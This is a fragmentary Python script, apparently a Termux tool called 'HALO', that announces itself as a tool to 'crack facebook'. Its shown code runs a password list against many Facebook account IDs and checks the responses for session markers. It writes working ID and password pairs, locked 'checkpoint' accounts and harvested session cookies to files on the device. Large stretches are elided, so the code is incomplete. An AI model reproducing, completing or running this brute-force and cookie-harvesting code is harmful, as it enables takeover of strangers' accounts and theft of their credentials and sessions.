...
#os.system('espeak -a 300 " Welcome,   to,  HALO,   Tools"')
time.sleep(2)
...
~~~~~~~~~~~~~~~~~~~~~~~~~
create + gashtyar £ RaWa🕷️
TOOL NEW FOR crack facebook💚📁
TOOL • GASHTYAR • RAWA👌🕷️
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                file = input(' NAME FILE \033[1;32m: ')
                                try:
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;36mHALO\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;33m%s%%\033[1;37m]\033[1;34m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                ...
                                if 'y' in pcp:
                                        print('\33[1;93m[HALO-CP] '+ids+' | '+pas+'\33[0;97m')
                                        open('/sdcard/HALO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HALO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " HALO,  OK,    ,ID   PASSWORD"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/HALO-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/HALO_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [HALO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HALO-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
